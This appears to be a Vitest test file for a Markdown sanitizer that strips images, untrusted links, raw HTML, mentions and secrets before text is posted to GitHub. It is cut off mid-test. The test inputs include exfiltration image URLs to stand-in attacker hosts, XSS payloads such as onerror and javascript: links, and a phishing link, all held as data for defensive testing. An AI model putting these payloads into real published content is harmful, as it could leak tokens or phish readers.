import { execFileSync } from "node:child_process";
import { describe, expect, it } from "vitest";
import {
  defangUrlText,
  escapeSlack,
  inlineCode,
  safeCut,
  sanitizeMarkdown,
  sanitizeMarkdownEx,
  singleLine,
  sliceSafe,
  wellFormed,
  type SanitizeOptions,
} from "../src/publish/sanitize.js";

const Z = "\u200B";
const OPTS: SanitizeOptions = { allowMentions: false, allowImages: false, linkAllowlist: ["github.com"], maxChars: 20000 };
const clean = (s: string, o: Partial<SanitizeOptions> = {}): string => sanitizeMarkdown(s, { ...OPTS, ...o });
/** Output with U+200B made visible, for readable expectations. */
const vis = (s: string, o: Partial<SanitizeOptions> = {}): string => clean(s, o).replaceAll(Z, "^");

const ALLOWED_HOST = /^(?:[a-z0-9-]+\.)*github\.com\.?$/i;

/**
 * Rendering invariants for prose output (no top-level code fences) with allowlist [github.com],
 * images and mentions disabled. Each check is a superset of what GitHub would render.
 */
function unsafeReasons(out: string): string[] {
  const bad: string[] = [];
  if (out.includes("![")) bad.push("image syntax");
  if (out.includes("<!--")) bad.push("html comment");
  for (const m of out.matchAll(/\]\(/g)) {
    const rest = out.slice((m.index ?? 0) + 2, (m.index ?? 0) + 300);
    const am = /^<([^>\n]*)>\)/.exec(rest);
    if (!am) {
      bad.push(`link tail ${JSON.stringify(rest.slice(0, 40))}`);
      continue;
    }
    const dest = am[1] ?? "";
    const abs = /^https?:\/\/([^/?#\\]*)/i.exec(dest);
    if (abs ? !ALLOWED_HOST.test(abs[1] ?? "") : /^[a-z][a-z0-9+.-]*:|^[\\/]{2}/i.test(dest)) bad.push(`link dest ${dest}`);
  }
  for (const m of out.matchAll(/\]:/g)) {
    const rest = out.slice((m.index ?? 0) + 2, (m.index ?? 0) + 300);
    const dm = /^ <([^>\n]*)>/.exec(rest);
    const abs = dm ? /^https?:\/\/([^/?#\\]*)/i.exec(dm[1] ?? "") : null;
    if (!dm || (abs && !ALLOWED_HOST.test(abs[1] ?? ""))) bad.push(`definition ${JSON.stringify(rest.slice(0, 40))}`);
  }
  for (const m of out.matchAll(/<(?=[A-Za-z/!?])/g)) {
    const rest = out.slice(m.index ?? 0, (m.index ?? 0) + 300);
    if (/^<\/?(?:details|summary|br|code|pre|sub|sup)>/.test(rest)) continue;
    const al = /^<https?:\/\/([^/?#\\>]*)[^>\s]*>/i.exec(rest);
    if (al && ALLOWED_HOST.test(al[1] ?? "")) continue;
    if (/^<[#/][^<>\n]*>\)/.test(rest)) continue; // relative destination inside "](<...>)"
    bad.push(`html ${JSON.stringify(rest.slice(0, 30))}`);
  }
  if (/(?<![A-Za-z0-9_])@[A-Za-z0-9]/.test(out)) bad.push("mention");
  // Kept (already vetted above) destinations are not rendered as text: skip them for URL checks.
  const text = out.replace(/\]\(<[^>\n]*>\)/g, "](<>)").replace(/\]: <[^>\n]*>/g, "]: <>");
  for (const m of text.matchAll(/([A-Za-z][A-Za-z0-9+.-]*):\/\/([^/\s?#<>\\]*)/g)) {
    const scheme = (/[A-Za-z]+$/.exec(m[1] ?? "")?.[0] ?? "").toLowerCase();
    if (!["http", "https"].includes(scheme) || !ALLOWED_HOST.test(m[2] ?? "")) bad.push(`url ${m[0]}`);
  }
  for (const m of text.matchAll(/www\.([^/\s?#<>\\]*)/gi)) {
    if (!ALLOWED_HOST.test(`www.${m[1] ?? ""}`)) bad.push(`www ${m[0]}`);
  }
  for (const m of out.matchAll(/&(#[0-9]+;?|#[xX][0-9a-fA-F]+;?|[A-Za-z][A-Za-z0-9]*;)/g)) {
    if (!/^(?:lt|gt|amp|quot|nbsp);$/.test(m[1] ?? "")) bad.push(`entity ${m[0]}`);
  }
  if (/\b(?:close[sd]?|fix(?:e[sd])?|resolve[sd]?)\b[\s:]*(?:#|GH-|[\w.-]+\/[\w.-]+#)\d/i.test(out)) bad.push("closing ref");
  return bad;
}

function expectSafe(input: string, o: Partial<SanitizeOptions> = {}): string {
  const out = clean(input, o);
  expect(unsafeReasons(out), `input ${JSON.stringify(input)}\noutput ${JSON.stringify(out)}`).toEqual([]);
  return out;
}

/* ------------- rendering checks with a real CommonMark/GFM parser (pandoc, when installed) ------------- */

const HAS_PANDOC = ((): boolean => {
  try {
    execFileSync("pandoc", ["--version"], { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
})();

function renderGfm(md: string): string {
  return execFileSync("pandoc", ["-f", "gfm", "-t", "html", "--no-highlight"], { input: md }).toString();
}

/**
 * What GitHub would render that the policy forbids (images off, mentions off, allowlist
 * [github.com]): raw <img>/<script>, links elsewhere, mentions in text. Code is escaped by the
 * renderer, so only real elements count; mentions are looked for outside <code> only.
 */
function renderedUnsafe(md: string): string[] {
  const html = renderGfm(md);
  const bad: string[] = [];
  if (/<img\b/i.test(html)) bad.push("img");
  if (/<script\b/i.test(html)) bad.push("script");
  for (const m of html.matchAll(/<a [^>]*href="([^"]*)"/g)) {
    if (!/^(?:https?:\/\/(?:[a-z0-9-]+\.)*github\.com(?:[/?#]|$)|[#/])/i.test(m[1] ?? "")) bad.push(`link ${m[1]}`);
  }
  const text = html.replace(/<code[^>]*>[\s\S]*?<\/code>/g, "").replace(/<[^>]*>/g, "");
  if (/(?<![A-Za-z0-9_])@[A-Za-z0-9]/.test(text)) bad.push("mention");
  return bad;
}

function expectRendersSafe(md: string, label = ""): void {
  if (!HAS_PANDOC) return;
  expect(renderedUnsafe(md), `${label}\nmarkdown ${JSON.stringify(md)}`).toEqual([]);
}

/** The payload a code block may carry verbatim; it must render as code (escaped), never as HTML. */
const PAYLOAD = '<img src="https://attacker.example/leak?d=X">\n<a href="https://evil.example/login">Re-authenticate</a> cc @acme/security';

describe("sanitizeMarkdown: images (exfiltration)", () => {
  it("removes inline images, keeping the alt text", () => {
    expect(vis("![secret](https://evil.com/x.png?d=TOKEN)")).toBe("^(image: secret)");
    expect(vis("![](https://evil.com/x.png)")).toBe("^(image)");
  });

  it("removes images even when the host is allowlisted, unless allowImages", () => {
    expect(vis("![a](https://github.com/x.png)")).toBe("^(image: a)");
    expect(clean("![a](https://github.com/x.png)", { allowImages: true })).toBe("![a](<https://github.com/x.png>)");
    expect(vis("![a](https://evil.com/x.png)", { allowImages: true })).toBe("^(image: a)");
  });

  it("neutralizes reference-style images and their definitions", () => {
    const out = expectSafe("![logo][r] and ![r]\n\n[r]: https://evil.com/x.png");
    expect(out).toContain("r (evil.com)");
    expect(out).not.toContain("https://evil.com");
    // Even an allowlisted definition cannot be used as an image.
    const out2 = expectSafe("![logo][r]\n\n[r]: https://github.com/x.png");
    expect(out2).toContain(`!${Z}[logo][r]`);
  });

  it("strips <img> and friends (any case, unquoted, slash-separated attributes)", () => {
    for (const s of [
      '<img src="https://evil.com/x.png">',
      "<IMG SRC=https://evil.com/x>",
      "<img/src=x onerror=alert(1)>",
      '<picture><source srcset="https://evil.com/a.png"></picture>',
      '<video poster="https://evil.com/p.png"></video>',
      '<svg><image href="https://evil.com/i"/></svg>',
    ]) {
      expectSafe(s);
    }
    expect(vis('a <img src="https://evil.com/x.png"> b')).toBe("a ^ b");
  });

  it("keeps an allowlisted <img> only with allowImages, with src/alt only", () => {
    expect(clean('<img src="https://github.com/a.png" alt="hi" onerror="x()" width=1>', { allowImages: true })).toBe(
      '<img src="https://github.com/a.png" alt="hi">',
    );
    expect(vis('<img src="https://evil.com/a.png">', { allowImages: true })).toBe("^");
  });

  it("handles images nested in links (badge pattern)", () => {
    expect(vis("[![b](https://evil.com/b.svg)](https://github.com/o/r)")).toBe("[^(image: b)](<https://github.com/o/r>)");
    expect(vis("[![b](https://github.com/b.svg)](https://evil.com)")).toBe("^^(image: b) (evil.com)");
  });
});

describe("sanitizeMarkdown: links", () => {
  it("keeps allowlisted links with a normalised destination and drops titles", () => {
    expect(clean('[pr](https://github.com/o/r/pull/1 "title")')).toBe("[pr](<https://github.com/o/r/pull/1>)");
    expect(clean("[g](https://gist.github.com/x)")).toBe("[g](<https://gist.github.com/x>)");
    expect(clean("[f](https://github.com/o/r/blob/main/a(b).ts)")).toBe("[f](<https://github.com/o/r/blob/main/a(b).ts>)");
    expect(clean("[rel](/o/r/pull/2) [frag](#L10)")).toBe("[rel](</o/r/pull/2>) [frag](<#L10>)");
  });

  it("turns other links into plain text 'label (host)'", () => {
    expect(vis("[click here](https://evil.com/phish)")).toBe("^click here (evil.com)");
    expect(vis("[x](javascript:alert(1))")).toBe("^x (link removed)");
    expect(vis("[x](data:text/html;base64,AAAA)")).toBe("^x (link removed)");
    expect(vis("[x](https://www.evil.com/)")).toBe("^x (www^.evil.com)");
  });

  it("is not fooled by host confusion", () => {
    for (const s of [
      "[a](https://github.com@evil.com/)",
      "[a](https://github.com.evil.com/)",
      "[a](https://evilgithub.com/)",
      "[a](//evil.com/x)",
      String.raw`[a](\\\\evil.com/x)`,
      String.raw`[a](<\\\\evil.com/x>)`,
      "[a](/\\evil.com/x)",
      "[a](https://github.com%2eevil.com/)",
      "[a](https://github.com:443@evil.com/)",
      "[a](https://git\u200Bhub.com/)",
      "[a](https://xn--github-xyz.com/)",
      "[a](https://0x7f.1/)",
    ]) {
      const out = expectSafe(s);
      expect(out, s).not.toContain("](");
    }
  });

  it("decodes escapes and entities in destinations before judging them", () => {
    expect(vis("[e](https\\://evil.com)")).toBe("^e (evil.com)");
    expect(clean(String.raw`[r](\\evil.com/x)`)).toBe("[r](<%5Cevil.com/x>)"); // "\\" decodes to one "\": relative
    expect(vis("[e](https&#58;//evil.com)")).toBe("^e (link removed)");
    expect(vis("[e](<https://evil.com/a b>)")).toBe("^e (link removed)");
    expect(vis("[e](  https://evil.com  'title'  )")).toBe("^e (evil.com)");
    expect(clean("[q](https://github.com/s?q=a&amp;type=code)")).toBe("[q](<https://github.com/s?q=a&type=code>)");
    expect(clean("[q](https://github.com/s?a=&amp;lt;)")).toBe("[q](<https://github.com/s?a=&amp;lt;>)");
  });

  it("breaks link syntax the parser does not recognise", () => {
    const out = expectSafe("[x](https://evil.com/" + "a".repeat(3000) + ")");
    expect(out).toContain(`]${Z}(`);
    expectSafe("[a\n\nb](https://evil.com)");
    expectSafe("[x](<https://evil.com>");
  });

  it("rewrites reference definitions: allowlisted kept, others plain text", () => {
    expect(clean("[click][g]\n\n[g]: https://github.com/o/r 'T'")).toBe("[click][g]\n\n[g]: <https://github.com/o/r>");
    expect(vis("[click][e]\n\n[e]: <https://evil.com/x>")).toBe("[click][e]\n\ne (evil.com)");
    // Definitions inside containers, split over lines, or interrupting a paragraph are broken.
    expectSafe("- [r]: https://evil.com\n\n[r]");
    expectSafe("> [r]: https://evil.com\n\n[r]");
    expectSafe("[r]:\n  https://evil.com\n\n[r]");
    expectSafe("text\n[r]: https://github.com/x\n\n[r]");
    expect(vis("para\n[g]: https://github.com/x")).toBe("para\n[g]^: https://github.com/x");
  });

  it("keeps allowlisted autolinks and bare URLs, defangs others", () => {
    expect(clean("<https://github.com/o/r>")).toBe("<https://github.com/o/r>");
    expect(vis("<https://evil.com/x>")).toBe("https:^//evil.com/x");
    expect(vis("see https://evil.com/p?q=1, ok")).toBe("see https:^//evil.com/p?q=1, ok");
    expect(vis("www.evil.com/x")).toBe("www^.evil.com/x");
    expect(clean("see https://github.com/o/r/pull/1.")).toBe("see https://github.com/o/r/pull/1.");
    expect(clean("HTTPS://GITHUB.COM/X and www.github.com/y")).toBe("HTTPS://GITHUB.COM/X and www.github.com/y");
    expect(vis("ftp://evil.com/x")).toBe("ftp:^//evil.com/x");
    expect(vis("x.https://evil.com")).toBe("x.https:^//evil.com");
    expect(vis("https://github.com@evil.com/")).not.toContain("https://github.com@");
  });

  it("never lets kept text hide a link reference definition", () => {
    for (const s of [
      "- [<https://github.com/a]://evil.com>\n\n[click][<https://github.com/a]",
      "- [https://github.com/a]://evil.com\n\n[c][https://github.com/a]",
      "[x](https://github.com/a]://evil.com)\n\n[t][x](<https://github.com/a]",
      "- [<img src=\"https://github.com/a\" alt=\"]://evil.com\">\n",
    ]) {
      expectSafe(s);
      // With images allowed the kept <img> is fine, but no definition may survive.
      expect(clean(s, { allowImages: true })).not.toMatch(/\]:(?! <https:\/\/github\.com)/);
    }
    expect(clean("[x](https://github.com/a[1])")).toBe("[x](<https://github.com/a%5B1%5D>)");
  });

  it("keeps query strings of allowlisted URLs intact", () => {
    expect(clean("https://github.com/search?q=x&type=code")).toBe("https://github.com/search?q=x&type=code");
    expect(clean("[s](https://github.com/search?q=x&type=code)")).toBe("[s](<https://github.com/search?q=x&type=code>)");
  });

  it("honours allowlist entries with schemes, wildcards and subdomains", () => {
    const o = { linkAllowlist: ["https://Docs.Example.com/path", "*.example.org", "bad entry", ""] };
    expect(clean("[d](https://docs.example.com/a)", o)).toBe("[d](<https://docs.example.com/a>)");
    expect(clean("[d](https://api.docs.example.com/a)", o)).toBe("[d](<https://api.docs.example.com/a>)");
    expect(clean("[o](https://x.example.org/)", o)).toBe("[o](<https://x.example.org/>)");
    expect(vis("[e](https://example.com/)", o)).toBe("^e (example.com)");
    expect(vis("[g](https://github.com/)", { linkAllowlist: [] })).toBe("^g (github.com)");
    expect(vis("[rel](/o/r)", { linkAllowlist: [] })).toBe("^rel (github.com)");
  });
});

describe("sanitizeMarkdown: raw HTML", () => {
  it("keeps only allowed tags, without attributes", () => {
    expect(clean('<details open class="x"><summary onclick="y">S</summary>body<br/>x<sub>1</sub><sup>2</sup></details>')).toBe(
      "<details><summary>S</summary>body<br>x<sub>1</sub><sup>2</sup></details>",
    );
    expect(clean("<pre lang=x><code>c</code></pre>")).toBe("<pre><code>c</code></pre>");
  });

  it("strips other tags but keeps their text", () => {
    expect(vis('<a href="https://evil.com">click</a>')).toBe("^click^");
    expect(vis("<script>alert(1)</script>")).toBe("^alert(1)^");
    expect(vis("<scr<script>ipt>x")).toBe("<^scr^ipt>x");
    expect(vis("<div style='position:fixed'>x</div>")).toBe("^x^");
  });

  it("neutralizes stray '<' and keeps inline code readable", () => {
    expect(vis("a < b and a<b")).toBe("a <^ b and a<^b");
    expect(vis("use `Array<string>` and `<img src=x>`")).toBe("use `Array<^string>` and `<^img src=x>`");
  });

  it("drops HTML comments, so markers cannot be spoofed", () => {
    expect(vis("a <!-- xrepo:c:0123456789ab --> b")).toBe("a ^ b");
    expect(clean("<!-- xrepo-review:sticky -->")).not.toContain("<!--");
    expectSafe("<!<!-- -->-- xrepo-review:sticky -->");
    expectSafe("<!---->x<!-->y<!--->z");
    expect(clean("unterminated <!-- comment")).not.toContain("<!--");
  });

  it("does not treat fences inside HTML blocks as code", () => {
    expectSafe('<details>\n```\n<img src="https://evil.com/z">\n```\n</details>');
    expectSafe('<pre>\n\n```\n<img src="https://evil.com/z">\n```\n</pre>');
    expectSafe("<!--\n```\n-->\n![x](https://evil.com/a)\n```");
  });
});

describe("sanitizeMarkdown: mentions, references, entities", () => {
  it("neutralizes user and team mentions but not emails", () => {
    expect(vis("cc @alice, @org/team (@bob) \u00E9@carol")).toBe("cc @^alice, @^org/team (@^bob) \u00E9@^carol");
    expect(clean("mail bob@example.com or a_b@x.io")).toBe("mail bob@example.com or a_b@x.io");
    expect(clean("cc @alice", { allowMentions: true })).toBe("cc @alice");
  });

  it("neutralizes entity-encoded mentions and other entity tricks", () => {
    for (const s of ["&#64;alice", "&#x40;alice", "&commat;alice", "&#64alice", "fixes &#35;12", "&#104;ttps://evil.com"]) {
      expectSafe(s);
    }
    expect(clean("x &lt; y &amp;&amp; z &gt; w &quot;q&quot; &nbsp;")).toBe("x &lt; y &amp;&amp; z &gt; w &quot;q&quot; &nbsp;");
    expect(clean("a && b & c &copy d")).toBe("a && b & c &copy d");
  });

  it("neutralizes closing keywords with issue references", () => {
    expect(vis("fixes #12")).toBe("fixes #^12");
    expect(vis("Closes: #3, resolved #4")).toBe("Closes: #^3, resolved #^4");
    expect(vis("Fixes owner/repo#5 and fix GH-6")).toBe("Fixes owner/repo#^5 and fix GH-^6");
    expect(vis("resolves https://github.com/o/r/issues/9")).toBe("resolves^ https://github.com/o/r/issues/9");
    expect(vis("fixes [the bug](https://github.com/o/r/issues/9)")).toContain("fixes^ [the bug]");
    expect(clean("see #12 and prefixes #3")).toBe("see #12 and prefixes #3");
  });
});

describe("sanitizeMarkdown: code blocks", () => {
  it("leaves fenced code byte-exact (except secrets)", () => {
    const code = "```ts\nconst u = '@user' + \"https://evil.com\" + `<img>` + '![x](y)'; // fixes #1\n```";
    expect(clean(code)).toBe(code);
    expect(clean("~~~\n<script>\n~~~")).toBe("~~~\n<script>\n~~~");
    expect(clean("```\nghp_abcdefghijklmnopqrstuvwxyz0123456789\n```")).toBe("```\n[REDACTED:github_token]\n```");
  });

  it("only recognises column-0 fences; container/indented fences stay prose", () => {
    expectSafe("> ```\n> x\n\n![x](https://evil.com/y.png)\n```");
    expectSafe("- item\n  ```\n  code\nnot indented ![i](https://evil.com/i)\n```");
    expectSafe("   ```\n@user\n   ```");
  });

  it("closes unclosed fences", () => {
    expect(clean("text\n```js\nx @y")).toBe("text\n```js\nx @y\n```");
    expect(clean("````\na\n```\nb")).toBe("````\na\n```\nb\n````");
  });

  it("rewrites ```suggestion unless allowed, and always outside top-level fences", () => {
    expect(clean("```suggestion\nfoo()\n```")).toBe("```text\nfoo()\n```");
    expect(clean("```suggestion\nfoo()\n```", { allowSuggestions: true })).toBe("```suggestion\nfoo()\n```");
    expect(clean("> ```suggestion\n> foo", { allowSuggestions: true })).toBe("> ```text\n> foo");
  });

  it("does not let a backtick-in-info line open a fence", () => {
    expectSafe("```a`b\n@user\n```");
  });
});

describe("sanitizeMarkdown: secrets, controls, truncation", () => {
  it("redacts secrets and reports the count", () => {
    const r = sanitizeMarkdownEx("token ghp_abcdefghijklmnopqrstuvwxyz0123456789 and AKIAABCDEFGHIJKLMNOP", OPTS);
    expect(r.text).toBe("token [REDACTED:github_token] and [REDACTED:aws_access_key]");
    expect(r.redactions).toBe(2);
  });

  it("strips control and bidi characters and normalises line endings", () => {
    expect(clean("a\u0000b\u202Ec\r\nd\re\u0007")).toBe("abc\nd\ne");
  });

  it("truncates to maxChars with a note", () => {
    const r = sanitizeMarkdownEx("word ".repeat(1000), { ...OPTS, maxChars: 500 });
    expect(r.truncated).toBe(true);
    expect(r.text.length).toBeLessThanOrEqual(500);
    expect(r.text.endsWith("(truncated)")).toBe(true);
  });

  it("closes a fence when truncating inside code", () => {
    const r = sanitizeMarkdownEx("intro\n\n```ts\n" + "line\n".repeat(500) + "```\nafter", { ...OPTS, maxChars: 300 });
    expect(r.text.length).toBeLessThanOrEqual(300);
    expect(r.text).toMatch(/\n```\n\n\u2026 \(truncated\)$/);
  });

  it("never leaves a cut URL clickable", () => {
    for (let max = 30; max < 70; max++) {
      const out = sanitizeMarkdown(`see https://github.com/${"a".repeat(40)} and [x](https://github.com/o/r) end`, { ...OPTS, maxChars: max });
      expect(out.length).toBeLessThanOrEqual(max);
      for (const m of out.matchAll(/https?:\/\/([^/\s<>)]*)/g)) expect(m[1]).toBe("github.com");
    }
  });

  it("handles tiny limits and non-string input", () => {
    expect(clean("hello world", { maxChars: 5 }).length).toBeLessThanOrEqual(5);
    expect(sanitizeMarkdown(undefined as unknown as string, OPTS)).toBe("");
  });
});

describe("sanitizeMarkdown: robustness", () => {
  it("is linear-time on pathological inputs", () => {
    const n = 200_000;
    const inputs = [
      "[".repeat(n),
      "](".repeat(n / 2),
      "<a ".repeat(n / 3),
      '<a x="'.repeat(n / 6),
      "` `` ``` ".repeat(n / 10),
      "&a;".repeat(n / 3),
      "https://".repeat(n / 8),
      "@".repeat(n),
      "[x](aaaa ".repeat(n / 9),
      "[".repeat(n / 2) + "](x)".repeat(n / 8),
      "[a]: b\n".repeat(n / 7),
      "<!--".repeat(n / 4),
      "fixes ".repeat(n / 6),
      "\\`".repeat(n / 2),
      "https://github.com/" + "a".repeat(n),
    ];
    for (const s of inputs) {
      const t = Date.now();
      sanitizeMarkdown(s, { ...OPTS, maxChars: 60000 });
      expect(Date.now() - t, s.slice(0, 20)).toBeLessThan(2000);
    }
  });

  it("keeps the invariants on random mixes of attack fragments", () => {
    const frags = [
      "![x](https://evil.com/a.png)", "[l](https://evil.com)", "[l](https://github.com/ok)", "<img src=https://evil.com/x>",
      "<a href='https://evil.com'>", "</a>", "<details>", "</details>", "<!--", "-->", "<!-- x -->", "@user", "@org/team",
      "&#64;", "&", "#12", "fixes", "Closes", "[", "]", "(", ")", "!", "<", ">", "https://evil.com/p", "https://github.com/o/r",
      "www.evil.com", "`", "``", "\\", "[r]:", "https://evil.com", "[r]", "\n", "\n\n", "> ", "- ", "  ```", "> ```", "|",
      "<https://evil.com>", "<https://github.com/x>", "javascript:alert(1)", "//evil.com", "&amp;", "&lt;", "<script>", "<b>",
      '"', "'", "*", "_", ":", "/", ".", "x", "github.com", "evil.com", "@", "[![", "](", "]:", "<details>\n", "&#x40;",
      "&commat;", "<!<!-- -->--", "xrepo:c:abcdef012345", "<pre>", "</pre>", "<https://github.com@evil.com>", "%2e", "\t",
      "[a]: https://evil.com", "[a]: https://github.com/z", "[a][b]", "\u200B", "\uE000", "\uE001", "<!X", "<?", "?>",
      "[<https://github.com/a]://evil.com>", "- [x]://evil.com", "[x](https://github.com/a]://evil.com)",
      "https://github.com/a]://evil.com", "https://github.com/a![x](//evil.com)", "<img src=https://github.com/a alt=']://e'>",
    ];
    let seed = Number(process.env.XREPO_FUZZ_SEED ?? 1234567);
    const iterations = Number(process.env.XREPO_FUZZ_ITER ?? 3000);
    const rnd = (n: number): number => {
      seed = (seed * 1103515245 + 12345) & 0x7fffffff;
      return seed % n;
    };
    const seps = ["", "", " ", "\n"];
    let checked = 0;
    for (let iter = 0; iter < iterations; iter++) {
      const k = 1 + rnd(25);
      let s = "";
      for (let i = 0; i < k; i++) s += (i ? (seps[rnd(seps.length)] ?? "") : "") + (frags[rnd(frags.length)] ?? "");
      if (/^(?:`{3,}|~{3,})/m.test(s)) continue; // top-level code fences are intentionally left alone
      checked++;
      expectSafe(s);
    }
    expect(checked).toBeGreaterThan(iterations * 0.66);
  });
});

describe("sanitizeMarkdown: block structure (regressions)", () => {
  it("does not end an HTML block at a line holding only a Unicode space (CommonMark blank = spaces/tabs)", () => {
    for (const sep of ["\u00A0", "\u3000", "\u2002", " \u00A0\t", "\u200B"]) {
      const input = `Summary.\n\n<details>\n${sep}\n\`\`\`\n${PAYLOAD}\n\`\`\``;
      const out = expectSafe(input);
      expect(out, JSON.stringify(sep)).not.toContain("<img");
      expect(out).not.toContain("@acme/security");
      expectRendersSafe(out, JSON.stringify(sep));
      expectRendersSafe(`${out}\n\n<!-- xrepo:c:0123456789ab -->`, JSON.stringify(sep));
    }
  });

  it("strips U+FEFF, so a line holding only it is a real blank line (code stays byte-exact)", () => {
    const input = `<details>\n\uFEFF\n\`\`\`\n${PAYLOAD}\n\`\`\`\n</details>`;
    expect(clean(input)).toBe(`<details>\n\n\`\`\`\n${PAYLOAD}\n\`\`\`\n</details>`);
    expectRendersSafe(clean(input));
    expect(clean("\uFEFF```\n@user\n```")).toBe("```\n@user\n```");
  });

  it("keeps the renderer's fences aligned with the sanitizer's code blocks", () => {
    const cases = [
      ` \`\`\`\nx\n\`\`\`\n${PAYLOAD}\n\`\`\``, // GitHub opens a fence at 1-3 spaces of indentation
      `   ~~~\nx\n~~~\n${PAYLOAD}\n~~~`,
      `\`\`\`\n    \`\`\`\n\`\`\`\n${PAYLOAD}\n\`\`\``, // 4 spaces do not close a fence
      `\`\`\`\n\t\`\`\`\n\`\`\`\n${PAYLOAD}\n\`\`\``,
      `<sub>x</sub>\n\`\`\`\nfoo\n\n\`\`\`\n${PAYLOAD}\n\`\`\``, // fence in a suspected (not real) HTML block
      `<sub>x</sub>\n\`\`\`\nfoo\n\`\`\`\n\n\`\`\`\n${PAYLOAD}\n\`\`\``,
      `para\n2. item\n   \`\`\`\nx\n\`\`\`\n${PAYLOAD}\n\`\`\``, // "2." cannot interrupt a paragraph: no list
      `| a |\n|---|\n- b\n  \`\`\`\nx\n\`\`\`\n${PAYLOAD}\n\`\`\``, // a table may swallow "- b"
    ];
    for (const input of cases) {
      const out = clean(input);
      // The payload is either kept verbatim inside one of the sanitizer's code blocks or sanitized.
      expect(out.includes(PAYLOAD) || !out.includes("<img"), input).toBe(true);
      expectRendersSafe(out, input);
      expectRendersSafe(`${out}\n\n\`\`\`suggestion\n${PAYLOAD}\n\`\`\``, input);
    }
    // Every fence line that could be read as a top-level fence was broken (no run of 3 left).
    expect(vis(" ```\nx\n```\nok\n```")).toBe(" ``^`\nx\n```\nok\n```");
  });

  it("judges HTML blocks on the output (sanitizing can start or keep open a block)", () => {
    // A definition label becomes "<details> (host)": a type-6 HTML block start in the output (ended
    // by a blank line before the code); the never-closed <details> itself is then dropped.
    const def = clean(`[<details>]: https://evil.com\n\`\`\`\n${PAYLOAD}\n\`\`\``);
    expect(def.startsWith(`${Z} (evil.com)\n\n\`\`\`\n`)).toBe(true);
    expectRendersSafe(def);
    // "[<pre>]: url" would open a type-1 block that only "</pre>" ends: the "<pre>" is dropped.
    const pre = clean(`[<pre>]: https://evil.com\n\`\`\`\n${PAYLOAD}\n\`\`\``);
    expect(pre).not.toContain("<pre>");
    expectRendersSafe(pre);
    // "`</pre>`" ends the block in the input, but its "</pre>" is neutralized in the output.
    const span = clean(`<pre>\n\`</pre>\`\n\`\`\`\n${PAYLOAD}\n\`\`\``);
    expect(span).not.toMatch(/^<pre>/);
    expectRendersSafe(span);
    // A type-7 tag cannot interrupt a paragraph, but "<pre>" can: both are tracked.
    expectRendersSafe(clean(`para\n<br>\n<pre>\n\n\`\`\`\n${PAYLOAD}\n\`\`\``));
  });

  it("never ends inside a <pre> block, so appended blocks cannot be swallowed", () => {
    expect(vis("Consider this change:\n<pre>")).toBe("Consider this change:\n^");
    expect(clean("<pre>x</pre>")).toBe("<pre>x</pre>");
    expect(clean("<pre>\nx\n</pre>\nafter")).toBe("<pre>\nx\n</pre>\nafter");
    for (const body of ["Consider:\n<pre>", "Consider:\n<PRE>", "Consider:\n<pre><code>", "x\n  <pre lang=ts>\n\ny"]) {
      const out = clean(body);
      const md = `${out}\n\n\`\`\`suggestion\n${PAYLOAD}\n\`\`\`\n\n<!-- xrepo:c:0123456789ab -->`;
      expect(out, body).not.toMatch(/^ {0,3}<pre/im);
      expectRendersSafe(md, body);
    }
    // Truncation can separate "<pre>" from "</pre>": the open "<pre>" is dropped as well.
    const cut = sanitizeMarkdownEx(`intro\n<pre>\n${"word ".repeat(100)}\n</pre>`, { ...OPTS, maxChars: 120 });
    expect(cut.truncated).toBe(true);
    expect(cut.text).not.toContain("<pre>");
    expectRendersSafe(`${cut.text}\n\n\`\`\`suggestion\n${PAYLOAD}\n\`\`\``);
  });

  it("keeps code blocks inside list items rendering", () => {
    const list = "Fixes:\n1. Guard the input:\n   ```ts\n   if (!x) return;\n   ```\n- Or:\n\n  ```\n  y();\n  ```";
    expect(clean(list)).toBe(list);
    expectRendersSafe(clean(list));
  });

  it("drops (never cuts) a body ```suggestion block that does not fit, and keeps one that fits", () => {
    const code = Array.from({ length: 40 }, (_, i) => `  const value${i} = compute(${i});`).join("\n");
    const input = `Use this:\n\n\`\`\`suggestion\n${code}\n\`\`\``;
    const cut = sanitizeMarkdownEx(input, { ...OPTS, maxChars: 400, allowSuggestions: true });
    expect(cut.truncated).toBe(true);
    expect(cut.text).not.toContain("```suggestion");
    expect(cut.text).not.toContain("value0");
    expect(cut.text.endsWith("\u2026 (truncated)")).toBe(true);
    const fits = sanitizeMarkdownEx(`${input}\n\n${"tail ".repeat(200)}`, { ...OPTS, maxChars: input.length + 100, allowSuggestions: true });
    expect(fits.truncated).toBe(true);
    expect(fits.text).toContain(`\`\`\`suggestion\n${code}\n\`\`\``);
    // Other code is still cut (at a line boundary) and closed.
    const plain = sanitizeMarkdownEx(input.replace("suggestion", "ts"), { ...OPTS, maxChars: 400 });
    expect(plain.text).toMatch(/^Use this:\n\n```ts\n(?: {2}const value\d+ = compute\(\d+\);\n)+```\n\n\u2026 \(truncated\)$/);
  });

  it("does not keep a body ```suggestion whose code had a secret redacted", () => {
    const out = clean("fix:\n\n```suggestion\nconst t = 'ghp_abcdefghijklmnopqrstuvwxyz0123456789';\n```", { allowSuggestions: true });
    expect(out).toBe("fix:\n\n```text\nconst t = '[REDACTED:github_token]';\n```");
  });

  it("closes code that is cut under a tiny limit", () => {
    const out = clean("```\nabcdefghij klmnop\n```", { maxChars: 18 });
    expect(out.length).toBeLessThanOrEqual(18);
    expect(out === "" || /\n```$/.test(out)).toBe(true);
  });

  it("returns well-formed UTF-16 (lone surrogates become U+FFFD)", () => {
    expect(clean("a\uD83Db \uDE00c \uD83D\uDE00")).toBe("a\uFFFDb \uFFFDc \uD83D\uDE00");
    expect(wellFormed("\uD83D")).toBe("\uFFFD");
  });

  it.runIf(HAS_PANDOC)("renders safely on random mixes that include fences, lists and HTML blocks", () => {
    const frags = [
      "```", "````", "~~~", " ```", "  ```", "   ```", "    ```", "\t```", "```suggestion", "```js", "``` x`y", "   ~~~",
      "<img src=https://evil.example/x>", "<a href=https://evil.example>x</a>", "@acme/team", "@bob", "&#64;bob",
      "<details>", "</details>", "<pre>", "</pre>", "`</pre>`", "<summary>s</summary>", "<br>", "<sub>x</sub>", "<div>",
      "- ", "1. ", "2. ", "* ", "> ", "| a |", "|---|", "\u00A0", "\u3000", "\uFEFF", "[<details>]: https://evil.example",
      "[<pre>]: https://evil.example", "<!--", "-->", "x", "para", "<script>", "</script>", "[x](https://evil.example)",
      "https://evil.example/p", "<!-- c -->", "- - -", "    code", "- a\n  ```", "1. a\n   ```", "  <pre>", "<?x", "?>",
    ];
    const seps = ["\n", "\n", "\n", "\n\n", "", " "];
